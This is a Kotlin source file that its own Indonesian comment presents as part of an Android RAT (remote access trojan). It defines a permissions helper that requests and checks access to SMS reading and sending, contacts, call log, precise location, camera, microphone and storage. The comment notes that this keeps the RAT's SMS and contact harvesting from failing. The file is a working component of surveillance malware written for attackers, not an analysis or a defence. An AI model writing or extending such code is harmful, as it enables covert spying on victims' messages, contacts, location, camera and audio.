package com.kai.mobilerat

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

/**
 * Permission runtime. Ini yang paling sering dilupakan di RAT Android: tanpa
 * permintaan eksplisit, `contentResolver.query()` untuk SMS dan kontak
 * melempar SecurityException, dan di versi lama exception itu membunuh
 * seluruh batch pesan, bukan cuma satu perintah.
 */
object Perms {

    fun wanted(): Array<String> {
        val list = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
        return list.toTypedArray()
    }

    fun has(ctx: Context, permission: String): Boolean = try {
        ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
    } catch (_: Exception) {
        false
    }

    fun missing(ctx: Context): List<String> = wanted().filter { !has(ctx, it) }

    fun short(permission: String): String = permission.substringAfterLast('.')

    fun hasSms(ctx: Context): Boolean =
        has(ctx, Manifest.permission.READ_SMS) && has(ctx, Manifest.permission.SEND_SMS)

    fun hasContacts(ctx: Context): Boolean = has(ctx, Manifest.permission.READ_CONTACTS)

    fun hasLocation(ctx: Context): Boolean =
        has(ctx, Manifest.permission.ACCESS_FINE_LOCATION) ||
            has(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
}
